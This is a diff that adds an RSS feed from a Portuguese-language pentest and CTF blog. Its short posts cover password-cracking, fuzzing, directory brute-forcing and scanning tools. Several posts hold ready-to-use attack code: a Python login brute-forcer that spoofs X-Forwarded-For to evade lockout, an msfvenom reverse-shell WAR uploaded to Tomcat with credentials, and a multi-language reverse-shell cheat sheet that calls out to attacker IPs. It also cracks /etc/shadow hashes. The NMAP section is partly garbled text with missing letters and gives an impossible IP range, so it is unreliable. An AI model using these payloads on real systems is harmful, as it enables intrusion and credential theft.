@@ -1,0 +1,266 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <docs>https://blogs.law.harvard.edu/tech/rss</docs>
+    <title>Ctf on FXShell - DevOps &amp; Sec</title>
+    <link>https://fxshelll.github.io/tags/ctf/</link>
+    <description>Recent content in Ctf on FXShell - DevOps &amp; Sec</description>
+    <ttl>1440</ttl>
+    <generator>Hugo 0.152.2</generator>
+    <language>pt-br</language>
+    <lastBuildDate>Mon, 30 Mar 2026 16:45:53 UT</lastBuildDate>
+    <atom:link href="https://fxshelll.github.io/tags/ctf/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Ferramentas De Quebra De Senhas</title>
+      <link>https://fxshelll.github.io/posts/ferramentas-de-quebra-de-senhas/</link>
+      <pubDate>Wed, 30 Sep 2020 23:58:15 UT</pubDate>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/ferramentas-de-quebra-de-senhas/</guid>
+      <description>Ferramentas de Quebra de Senhas
+Hydra O Hydra é uma ferramenta famosa que realiza ataque de dicionário a serviços. Seu uso é, basicamente, assim:
+hydra -l &lt;login&gt; -p &lt;senha&gt; &lt;IP&gt; &lt;serviço&gt; -t &lt;tasks&gt; Abaixo, um exemplo de uma tentativa única (-t 1) com o usuário root (-l root) e a senha 12345 (-p 12345) no endereço 10.0.2.2 no serviço ssh:
+hydra -l root -p 12345 10.0.2.2 ssh -t 1 Podemos passar um dicionário de logins e senhas com o parâmetro -L e -P:
+</description>
+      <content:encoded><![CDATA[Ferramentas de Quebra de Senhas
+Hydra O Hydra é uma ferramenta famosa que realiza ataque de dicionário a serviços. Seu uso é, basicamente, assim:
+hydra -l &lt;login&gt; -p &lt;senha&gt; &lt;IP&gt; &lt;serviço&gt; -t &lt;tasks&gt; Abaixo, um exemplo de uma tentativa única (-t 1) com o usuário root (-l root) e a senha 12345 (-p 12345) no endereço 10.0.2.2 no serviço ssh:
+hydra -l root -p 12345 10.0.2.2 ssh -t 1 Podemos passar um dicionário de logins e senhas com o parâmetro -L e -P:
+hydra -L &lt;arquivo_login&gt; -P &lt;arquivo_senha&gt; &lt;IP&gt; &lt;serviço&gt; hydra -L login.txt -P senha.txt 10.0.2.2 ssh -t 4 O Hydra também possui uma interface gráfica que pode ser chamada com o comando:
+Medusa Assim como o Hydra, o Medusa realiza ataque de dicionário a serviços. Seu uso é basicamente:
+Para listar os módulos
+medusa -q | more
+Comando:
+medusa -h -u -p -M medusa -h 10.10.100.25 -u admin -p 1234 -M ftp
+Lista de IP, usuários e senhas
+medusa -H -U -P -M medusa -H hosts.txt -U users.txt -P pass.txt -M smbnt
+John the Ripper O John the Ripper (o nome da ferramenta faz alusão a um famoso psicopata do século 19, Jack, o Estripador) é uma das ferramentas mais usadas em pentest, sendo ele um utilitário que faz quebra de senhas de três modos:
+WordList → Ele tenta por uma Wordlist, testando as combinaçõesde senha/usuário. Single Crack → Ele tenta quebrar a senha usando as informaçõesde login. Incremental → Sendo o modo mais robusto no John the Ripper,ele tentará cada caractere possível até achar a senha correta. Epor esse motivo, é indicado o uso de parâmetros com o intuito dereduzir o tempo de quebra. No caso do modo incremental, é necessário ter o arquivo contendo o hash da senha do usuário (SAM no Windows ou /etc/shadow no Linux).
+Seu uso é basicamente:
+john &ndash;wordlist=dicionario.txt
+john &ndash;single
+john &ndash;incremental
+john &ndash;wordlist=dicionario.txt &ndash;format=NT
+As senhas quebradas são armazenadas no arquivo:
+&lt;home_do_usuário)&gt;/.john/john.pot
+E assim como o Hydra, o JtR também tem uma Interface Gráfica, que pode ser chamada pelo comando:
+johnny
+OphCrack O OphCrack é uma ferramenta nativa do Kali Linux e específica para uso com Rainbow Tables. Com uma interface gráfica bem intuitiva, o OphCrack é ideal para realizar ataques de Brute Force em sistemas Windows.
+Hashcat Também nativo do Kali, o Hashcat é uma ferramenta específica para realizar ataques do tipo Password Cracking. Uma das features mais interessantes dela é a possibilidade de se utilizar o processador da placa de vídeo para dar mais performance ao ataque.
+Seu uso é basicamente:
+hashcat -m -a -o &lt;arquivo de saída&gt; &lt;dicionário&gt;
+Exemplo:
+hashcat -m 1800 -a 0 -o cracked.txt /etc/shadow /usr/share
+/usr/share/wordlists/rockyou.txt
+Caso os drivers da placa de vídeo não estejam instalados, é necessário utilizar a opção &ndash;force, desta forma:
+hashcat -m 1800 -a 0 -o cracked.txt /etc/shadow /usr/share /usr/share/wordlists/rockyou.txt &ndash;force
+Metasploit Framework O Metasploit (MSF) é um framework criado por H.D.Moore, que serve para elaboração e execução de um repositório de exploits.
+Apesar de não ser esse o objetivo da ferramenta, o MSF possui módulos de ataque Força Bruta para diversas aplicações, como, por exemplo, o SSH, que pode ser executado por meio da sequência de comandos abaixo:
+service postgresql start msfconsole use &lt;auxiliar&gt; auxiliary/scanner/ssh/ssh_login auxiliary/scanner/ftp/ftp_login auxiliary/scanner/smb/smb_login auxiliary/scanner/telnet/telnet_login show options set &lt;parametros&gt; run ]]></content:encoded>
+    </item>
+    <item>
+      <title>Steghide</title>
+      <link>https://fxshelll.github.io/posts/steghide/</link>
+      <pubDate>Thu, 20 Aug 2020 02:23:34 UT</pubDate>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/steghide/</guid>
+      <description>$ sudo apt-get install steghide #para embedar um arquivo de texto dentro de uma imagem $ steghide embed -cf picture.jpg -ef secret.txt #para extrair o arquivo de dentro da imagem $ steghide extract -sf picture.jpg #para exibir informações sobre o arquivo de imagem com o embed $ steghide info picture.jpg </description>
+      <content:encoded><![CDATA[$ sudo apt-get install steghide #para embedar um arquivo de texto dentro de uma imagem $ steghide embed -cf picture.jpg -ef secret.txt #para extrair o arquivo de dentro da imagem $ steghide extract -sf picture.jpg #para exibir informações sobre o arquivo de imagem com o embed $ steghide info picture.jpg ]]></content:encoded>
+    </item>
+    <item>
+      <title>Wfuzz</title>
+      <link>https://fxshelll.github.io/posts/wfuzz/</link>
+      <pubDate>Fri, 31 Jul 2020 04:13:20 UT</pubDate>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/wfuzz/</guid>
+      <description>É umaferramenta de fuzzing criado para facilitar a tarefa de avaliação de aplicações web e baseia-se num conceito muito simples: substitui qualquer referência à palavra-chave FUZZ pelo valor de um determinado payload. Um payload no Wfuzz é uma fonte de dados.
+wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 http://10.15.0.1/FUZZ
+c colorir saída
+w caminho da wordlist
+hc ignorar erros
+</description>
+      <content:encoded><![CDATA[É umaferramenta de fuzzing criado para facilitar a tarefa de avaliação de aplicações web e baseia-se num conceito muito simples: substitui qualquer referência à palavra-chave FUZZ pelo valor de um determinado payload. Um payload no Wfuzz é uma fonte de dados.
+wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 http://10.15.0.1/FUZZ
+c colorir saída
+w caminho da wordlist
+hc ignorar erros
+]]></content:encoded>
+    </item>
+    <item>
+      <title>GoBuster</title>
+      <link>https://fxshelll.github.io/posts/gobuster/</link>
+      <pubDate>Tue, 28 Jul 2020 02:44:29 UT</pubDate>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/gobuster/</guid>
+      <description>GoBuster Primo do DIRB
+O Gobuster é uma ótima ferramenta utilizada para força bruta em URI’s (diretórios e arquivos)
+-fw – força o processamento de um domínio com resultados curinga. -np – oculta a saída do progresso. -m &lt;modo&gt; – qual modo usar, dir ou dns (padrão: dir). -q – desativa a saída de banner / sublinhado. -t &lt;threads&gt; – número de encadeamentos a serem executados (padrão: 10). -u &lt;url / domain&gt; – URL completo (incluindo esquema) ou nome de domínio base. -v – saída detalhada (mostra todos os resultados). -w &lt;wordlist&gt; – caminho para a lista de palavras usada para força bruta (use – para stdin). Eu poderia usar o DIRB? Sim, por que ele vai fazer o scanning de páginas também. Ficaria assim:
+</description>
+      <content:encoded><![CDATA[GoBuster Primo do DIRB
+O Gobuster é uma ótima ferramenta utilizada para força bruta em URI’s (diretórios e arquivos)
+-fw – força o processamento de um domínio com resultados curinga. -np – oculta a saída do progresso. -m &lt;modo&gt; – qual modo usar, dir ou dns (padrão: dir). -q – desativa a saída de banner / sublinhado. -t &lt;threads&gt; – número de encadeamentos a serem executados (padrão: 10). -u &lt;url / domain&gt; – URL completo (incluindo esquema) ou nome de domínio base. -v – saída detalhada (mostra todos os resultados). -w &lt;wordlist&gt; – caminho para a lista de palavras usada para força bruta (use – para stdin). Eu poderia usar o DIRB? Sim, por que ele vai fazer o scanning de páginas também. Ficaria assim:
+$ dirb http://192.168.219.128:65535 /usr/share/dirb/wordlists/big.txt
+Com o GoBuster faria o brute force + o scanning de diretórios, utilizando a mesma wordlist do DIRB.
+$ gobuster dir -u http://192.168.219.128:65535 -w /usr/share/dirb/wordlists/big.txt
+-w &lt;wordlist&gt; -u &lt;url&gt; ]]></content:encoded>
+    </item>
+    <item>
+      <title>Wordlist com Palavras do Site</title>
+      <link>https://fxshelll.github.io/posts/wordlist/</link>
+      <pubDate>Thu, 23 Jul 2020 02:58:13 UT</pubDate>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/wordlist/</guid>
+      <description>Gerando wordlist com palavras do site cewl -w wordlists.txt -d 10 -m 1 http://seualvo.com/
+Crie o arquivo brute.py Para executa-lo basta rodar o comando:
+$ python3 brute.py
+import re import requests def open_ressources(file_path): return [item.replace(&#34;\n&#34;, &#34;&#34;) for item in open(file_path).readlines()] #alvo host = &#39;http://seualvo.com&#39; #url do login login_url = host + &#39;/admin/login&#39; #user username = &#39;admin&#39; #caminho da wordlist wordlist = open_ressources(&#39;/root/wordlists.txt&#39;) for password in wordlist: session = requests.Session() login_page = session.get(login_url) csrf_token = re.search(&#39;input.+?name=&#34;tokenCSRF&#34;.+?value=&#34;(.+?)&#34;&#39;, login_page.text).group(1) print(&#39;[*] Trying: {p}&#39;.format(p = password)) headers = { &#39;X-Forwarded-For&#39;: password, &#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&#39;, &#39;Referer&#39;: login_url } data = { &#39;tokenCSRF&#39;: csrf_token, &#39;username&#39;: username, &#39;password&#39;: password, &#39;save&#39;: &#39;&#39; } login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False) if &#39;location&#39; in login_result.headers: if &#39;/admin/dashboard&#39; in login_result.headers[&#39;location&#39;]: print() print(&#39;SUCCESS: Password found!&#39;) print(&#39;Use {u}:{p} to login.&#39;.format(u = username, p = password)) print() break </description>
+      <content:encoded><![CDATA[Gerando wordlist com palavras do site cewl -w wordlists.txt -d 10 -m 1 http://seualvo.com/
+Crie o arquivo brute.py Para executa-lo basta rodar o comando:
+$ python3 brute.py
+import re import requests def open_ressources(file_path): return [item.replace(&#34;\n&#34;, &#34;&#34;) for item in open(file_path).readlines()] #alvo host = &#39;http://seualvo.com&#39; #url do login login_url = host + &#39;/admin/login&#39; #user username = &#39;admin&#39; #caminho da wordlist wordlist = open_ressources(&#39;/root/wordlists.txt&#39;) for password in wordlist: session = requests.Session() login_page = session.get(login_url) csrf_token = re.search(&#39;input.+?name=&#34;tokenCSRF&#34;.+?value=&#34;(.+?)&#34;&#39;, login_page.text).group(1) print(&#39;[*] Trying: {p}&#39;.format(p = password)) headers = { &#39;X-Forwarded-For&#39;: password, &#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&#39;, &#39;Referer&#39;: login_url } data = { &#39;tokenCSRF&#39;: csrf_token, &#39;username&#39;: username, &#39;password&#39;: password, &#39;save&#39;: &#39;&#39; } login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False) if &#39;location&#39; in login_result.headers: if &#39;/admin/dashboard&#39; in login_result.headers[&#39;location&#39;]: print() print(&#39;SUCCESS: Password found!&#39;) print(&#39;Use {u}:{p} to login.&#39;.format(u = username, p = password)) print() break ]]></content:encoded>
+    </item>
+    <item>
+      <title>Dirsearch</title>
+      <link>https://fxshelll.github.io/posts/dirsearch/</link>
+      <pubDate>Thu, 23 Jul 2020 02:37:57 UT</pubDate>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/dirsearch/</guid>
+      <description>DIRSEARCH ================ https://github.com/maurosoria/dirsearch
+O dirsearch é uma ferramenta simples de linha de comando projetada para diretórios e arquivos de força bruta em sites.
+Particularmente prefiro ele ao invés do DIRB ou GoBuster, já obtive mais resultados com ele, porém depois vou escrever sobre essas outras duas ferramentas aqui também.
+Uso git clone https://github.com/maurosoria/dirsearch.git
+$ cd dirsearch
+python3 dirsearch.py -u &lt;URL&gt; -e &lt;EXTENSION&gt;
+Exemplo $ python3 dirsearch.py -u http://sitedoalvo.com.br(ou IP) -e *
+</description>
+      <content:encoded><![CDATA[DIRSEARCH ================ https://github.com/maurosoria/dirsearch
+O dirsearch é uma ferramenta simples de linha de comando projetada para diretórios e arquivos de força bruta em sites.
+Particularmente prefiro ele ao invés do DIRB ou GoBuster, já obtive mais resultados com ele, porém depois vou escrever sobre essas outras duas ferramentas aqui também.
+Uso git clone https://github.com/maurosoria/dirsearch.git
+$ cd dirsearch
+python3 dirsearch.py -u &lt;URL&gt; -e &lt;EXTENSION&gt;
+Exemplo $ python3 dirsearch.py -u http://sitedoalvo.com.br(ou IP) -e *
+_|. _ _ _ _ _ _|_ v0.3.9 (_||| _) (/_(_|| (_| ) Extensions: | HTTP method: getSuffixes: CHANGELOG.md | HTTP method: get | Threads: 10 | Wordlist size: 6552 | Request count: 6552 Error Log: /root/dirsearch/logs/errors-20-06-29_23-59-23.log Target: http://10.10.10.185 Output File: /root/dirsearch/reports/10.10.10.185/20-06-29_23-59-24 [23:59:24] Starting: [00:00:12] 301 - 313B - /images -&gt; http://10.10.10.185/images/ [00:00:14] 403 - 277B - /index.shtml [00:00:14] 200 - 67KB - /index.php [00:00:14] 200 - 67KB - /index.php/login/ [00:00:14] 403 - 277B - /install.sql [00:00:17] 403 - 277B - /localhost.sql [00:00:17] 403 - 277B - /log.sqlite [00:00:18] 200 - 4KB - /login.php [00:00:18] 403 - 277B - /login.shtml [00:00:19] 403 - 277B - /logs.sqlite O dirsearch vai encontrar pastas e urls uteis para a exploração de vulnerabilidades.
+]]></content:encoded>
+    </item>
+    <item>
+      <title>sh_MSFvenom</title>
+      <link>https://fxshelll.github.io/posts/sh_msfvenom/</link>
+      <pubDate>Thu, 23 Jul 2020 02:25:57 UT</pubDate>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/sh_msfvenom/</guid>
+      <description>echo &#34;-------------------------------------CRIANDO UM EXPLOID COM MSFVENOM----------------------------------------------------&#34; msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.29 LPORT=4444 -f war &gt; exploit.war #IP do seu local host + porta #Criação do arquivo .WAR echo &#34;-------------------------------------UPLOAD DO EXPLOIT NO ALVO---------------------------------------------------------&#34; curl --user &#39;tomcat:$3cureP4s5w0rd123!&#39; --upload-file exploit.war &#34;http://10.10.10.194:8080/manager/text/deploy?path=/exploit.war&#34; #O ataque foi em um alvo cujo tomcat9 estava vulneravel #IP do RHOST(alvo) + porta da aplicação #upload do arquivo .war echo &#34;------------------------------------sucesso no upload -----------------------------------------------------&#34; echo &#34;-----------------------------------Se conectando ao netcat---------------------------------------------------------&#34; echo &#34;----------------------------------- http://10.10.10.194:8080/exploit.war ---------------------------------------------&#34; nc -nvlp 4444 #em outra aba do terminal, deixe escutando na porta que desejar # nc -nvlp 4444 Quando estiver ouvindo a porta, vá no navegador e chame o arquivo que você acabou de fazer o upload
+</description>
+      <content:encoded><![CDATA[echo &#34;-------------------------------------CRIANDO UM EXPLOID COM MSFVENOM----------------------------------------------------&#34; msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.29 LPORT=4444 -f war &gt; exploit.war #IP do seu local host + porta #Criação do arquivo .WAR echo &#34;-------------------------------------UPLOAD DO EXPLOIT NO ALVO---------------------------------------------------------&#34; curl --user &#39;tomcat:$3cureP4s5w0rd123!&#39; --upload-file exploit.war &#34;http://10.10.10.194:8080/manager/text/deploy?path=/exploit.war&#34; #O ataque foi em um alvo cujo tomcat9 estava vulneravel #IP do RHOST(alvo) + porta da aplicação #upload do arquivo .war echo &#34;------------------------------------sucesso no upload -----------------------------------------------------&#34; echo &#34;-----------------------------------Se conectando ao netcat---------------------------------------------------------&#34; echo &#34;----------------------------------- http://10.10.10.194:8080/exploit.war ---------------------------------------------&#34; nc -nvlp 4444 #em outra aba do terminal, deixe escutando na porta que desejar # nc -nvlp 4444 Quando estiver ouvindo a porta, vá no navegador e chame o arquivo que você acabou de fazer o upload
+http://10.10.10.194:8080/exploit.war/
+volte no terminal, ele vai ter conectado via shell agora execute o shell reverso em python para o term
+listening on [any] 4444 &hellip; connect to [10.10.14.29] from (UNKNOWN) [10.10.10.194] 50476
+$ python3 -c &quot;import pty;pty.spawn('/bin/bash')&quot;
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Reverse Shell</title>
+      <link>https://fxshelll.github.io/posts/dicasdereverseshell/</link>
+      <pubDate>Thu, 23 Jul 2020 01:51:31 UT</pubDate>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/dicasdereverseshell/</guid>
+      <description>Python =====================
+python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.15&#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39; Bash =====================
+bash -i &gt;&amp; /dev/tcp/192.168.19.68/4455 0&gt;&amp;1 PERL =====================
+perl -e &#39;use Socket;$i=&#34;10.0.0.1&#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39; PHP =====================
+php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,1234);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39; Ruby =====================
+ruby -rsocket -e&#39;f=TCPSocket.open(&#34;10.0.0.1&#34;,1234).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39; Netcat =====================
+nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f Java =====================
+r = Runtime.getRuntime() p = r.exec([&#34;/bin/bash&#34;,&#34;-c&#34;,&#34;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&#34;] as String[]) p.waitFor()[Untested submission from anonymous reader] xterm =====================
+</description>
+      <content:encoded><![CDATA[Python =====================
+python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.15&#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39; Bash =====================
+bash -i &gt;&amp; /dev/tcp/192.168.19.68/4455 0&gt;&amp;1 PERL =====================
+perl -e &#39;use Socket;$i=&#34;10.0.0.1&#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39; PHP =====================
+php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,1234);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39; Ruby =====================
+ruby -rsocket -e&#39;f=TCPSocket.open(&#34;10.0.0.1&#34;,1234).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39; Netcat =====================
+nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f Java =====================
+r = Runtime.getRuntime() p = r.exec([&#34;/bin/bash&#34;,&#34;-c&#34;,&#34;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&#34;] as String[]) p.waitFor()[Untested submission from anonymous reader] xterm =====================
+xterm -display 10.0.0.1:1 Xnest :1 xhost +targetip ]]></content:encoded>
+    </item>
+    <item>
+      <title>Nikto</title>
+      <link>https://fxshelll.github.io/posts/nikto/</link>
+      <pubDate>Thu, 23 Jul 2020 01:47:23 UT</pubDate>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/nikto/</guid>
+      <description>NIKTO ================
+Examine o servidor da Web em busca de vulnerabilidades conhecidas, incluindo:
+Configurações incorretas de servidor e software Arquivos e programas padrão Arquivos e programas inseguros Servidores e programas desatualizados Não é necessário fazer a instalação do mesmo pois ele é um script perl.
+Ele vem nativo no kali, para atualizar recomendo baixar direto do git deles.
+https://github.com/sullo/nikto
+git clone https://github.com/sullo/nikto # Main script is in program/ cd nikto/program # Run using the shebang interpreter ./nikto.pl -h http://www.example.com # Run using perl (if you forget to chmod) perl nikto.pl -h http://www.example.com -h + alvo (por padrão setada porta 80) -o posso gerar relatório em html ou txt, csv. -p posso setar as portas que quero separados por virgula. exemplo: nikto -h 192.168.0.126 -p 8081, 443 -o scan.html
+</description>
+      <content:encoded><![CDATA[NIKTO ================
+Examine o servidor da Web em busca de vulnerabilidades conhecidas, incluindo:
+Configurações incorretas de servidor e software Arquivos e programas padrão Arquivos e programas inseguros Servidores e programas desatualizados Não é necessário fazer a instalação do mesmo pois ele é um script perl.
+Ele vem nativo no kali, para atualizar recomendo baixar direto do git deles.
+https://github.com/sullo/nikto
+git clone https://github.com/sullo/nikto # Main script is in program/ cd nikto/program # Run using the shebang interpreter ./nikto.pl -h http://www.example.com # Run using perl (if you forget to chmod) perl nikto.pl -h http://www.example.com -h + alvo (por padrão setada porta 80) -o posso gerar relatório em html ou txt, csv. -p posso setar as portas que quero separados por virgula. exemplo: nikto -h 192.168.0.126 -p 8081, 443 -o scan.html
+Toda vez que precisar rodar o nikto em diferentes diretorios do seu alvo, é necessário colocar o &lsquo;http&rsquo; na frente.
+ex: nikto -h http://192.168.0.126/files -p 8081, 443 -o scan.html
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Searchexploit</title>
+      <link>https://fxshelll.github.io/posts/searchexploit/</link>
+      <pubDate>Thu, 23 Jul 2020 01:46:40 UT</pubDate>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/searchexploit/</guid>
+      <description>SEARCHSPLOIT ================
+Searchsploit, é uma ferramenta de pesquisa de linha de comando do Exploit-DB que também permite que você leve uma cópia do Exploit Database com você, aonde quer que você vá. O SearchSploit oferece a capacidade de realizar pesquisas off-line detalhadas por meio de sua cópia do repositório com check-out local. Esse recurso é particularmente útil para avaliações de segurança em redes segregadas ou com falta de ar sem acesso à Internet.
+</description>
+      <content:encoded><![CDATA[SEARCHSPLOIT ================
+Searchsploit, é uma ferramenta de pesquisa de linha de comando do Exploit-DB que também permite que você leve uma cópia do Exploit Database com você, aonde quer que você vá. O SearchSploit oferece a capacidade de realizar pesquisas off-line detalhadas por meio de sua cópia do repositório com check-out local. Esse recurso é particularmente útil para avaliações de segurança em redes segregadas ou com falta de ar sem acesso à Internet.
+Com as informações dos serviços coletados pelo NMAP, seria maneiro procurar no searchsploit se este serviço contém alguma vulnerabilidade, procurando um exploit para ele.
+Neste caso podemos usar o searchsploit da seguinte maneira:
+fpmatta@T-REX ~&gt; searchsploit vsftpd ------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------- --------------------------------- vsftpd 2.0.5 - &#39;CWD&#39; (Authenticated) Remot | linux/dos/5814.pl vsftpd 2.0.5 - &#39;deny_file&#39; Option Remote D | windows/dos/31818.sh vsftpd 2.0.5 - &#39;deny_file&#39; Option Remote D | windows/dos/31819.pl vsftpd 2.3.2 - Denial of Service | linux/dos/16270.c vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/17491.rb ------------------------------------------- --------------------------------- Para atualizar a base do searchsploit faça:
+$ searchsploit -u
+Se não tiver ele instalado no seu S.O (caso não esteja utilizando o Kali linux):
+Clone o repositório, adicione o binário ao seu $PATH e edite o arquivo de configuração para refletir o caminho do git:
+$ sudo git clone https://github.com/offensive-security/exploitdb.git /opt/exploitdb
+$ sudo ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit
+]]></content:encoded>
+    </item>
+    <item>
+      <title>NMAP</title>
+      <link>https://fxshelll.github.io/posts/toolsforpentest/</link>
+      <pubDate>Wed, 15 Jul 2020 18:02:31 UT</pubDate>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/toolsforpentest/</guid>
+      <description>NMAP ================
+O Nmap (“Network Mapper”) é uma ferramenta de código aberto para exploração de rede e auditoria de segurança. Ela foi desenhada para escanear rapidamente redes amplas, embora funcione m contra hos iduais. O Nmap utiliza IP em esta (raw) de m novadora para determina hos dis na rede, quais serviços ( apl ve hos cem sistemas operac ver est ue tipos de filtro de fir uso outras características. o N nor utilizado para audito seg adm e sistemas e red úti rot omo inventário d ger ser atu ados, e monitora disponibilidade de serviço.
+</description>
+      <content:encoded><![CDATA[NMAP ================
+O Nmap (“Network Mapper”) é uma ferramenta de código aberto para exploração de rede e auditoria de segurança. Ela foi desenhada para escanear rapidamente redes amplas, embora funcione m contra hos iduais. O Nmap utiliza IP em esta (raw) de m novadora para determina hos dis na rede, quais serviços ( apl ve hos cem sistemas operac ver est ue tipos de filtro de fir uso outras características. o N nor utilizado para audito seg adm e sistemas e red úti rot omo inventário d ger ser atu ados, e monitora disponibilidade de serviço.
+Para cada caso de enumeração e circunstâncias, existe flags especificas para cada tipo de alvo, geralmente dou um scan superficial no inicio, e depois utilizo algo mais profundo. As flags que mais utilizo são as seguintes:
+nmap -sV -sC -Pn -T4 -v -p- &ndash;min-rate=10000 Identifica hosts ativos com a porta 445 aberta
+nmap &ndash;open -v -sS -p 445 -Pn 293.268.20.0/34 -oG smb.txt Cria arquivo com uma saída mais limpa, somente IPs
+cat smb.txt |grep &ldquo;Up&rdquo;|cut -d &quot;&quot; -f2 &gt; targets Canivete suiço para enumerar os hosts (nome,dominio..)
+crackmapexec smb targets Capturar hashes NBT-NS / LLMNR
+Alterar o arquivo /etc/responder/Responder.conf
+; Specific IP Addresses to respond to (default = All) ; Example: RespondTo = 10.20.1.100-150, 10.20.3.10 RespondTo = &lt;host_1&gt;&lt;host_2&gt;&lt;host_3&gt;&lt;host_4&gt;&lt;&hellip;&gt;
+responder -l -Prv Também são muito utilizadas as flags abaixo desde o mais simples para um scan mais completo.
+Varredura de porta TCP SYN (padrão)
+nmap -sS 192.168.1.1 Tentativas para determinar a versão do serviço em execução na porta
+nmap -sV 192.168.1.1 Scan com scripts NSE padrão. Considerado útil para descoberta e segurança
+nmap -sC 192.168.1.1 Desative a descoberta de host. Somente varredura de porta.
+nmap -Pn 192.168.1.1-5 Scan agressivo (4) mais acelerado, utilizar somente quando você estiver em uma rede razoavelmente rápida e confiável.
+nmap -T4 192.168.1.1 Aumente o nível de verbosidade (-v ou use -vv mais para obter um efeito maior)
+nmap -v 192.168.1.1 Envie pacotes não mais lentos que &lt;número&gt; por segundo. (&ndash;min-rate)
+nmap --min-rate=1000 192.168.1.1 Envie pacotes não mais rapidos que &lt;número&gt; por segundo. (&ndash;max-rate)
+nmap --max-rate=1000 192.168.1.1 Efetua o handshake triplo do TCP. O Nmap solicita ao sistema operacional subjacente que estabeleça uma conexão com o destino na porta especificada.
+nmap -sT 192.168.1 Envia um SYN TCP para ver se a porta de destino responde com um SYN ACK (porta aberta) ou um RST (porta fechada). Também conhecida como varredura semi-aberta, pois não conclui o handshake do TCP. Esse é o padrão para usuários root.
+nmap -sS 192.168.1 Realiza uma varredura UDP. Como o UDP não usa um handshake, um serviço escutando uma porta UDP pode não enviar nenhuma resposta. As portas que enviam uma resposta são exibidas como abertas. -sU (varredura UDP).
+nmap -sU 192.168.1.50 Ativa a detecção do SO.
+nmap -O 192.168.1.50 Quantos hosts ativos.
+nmap -sP 192.168.1.0/24 Script para automatizar o processo de Scan em hosts ativos, pode personalizar com suas flags favoritas.
+# nano maroto_scan.sh
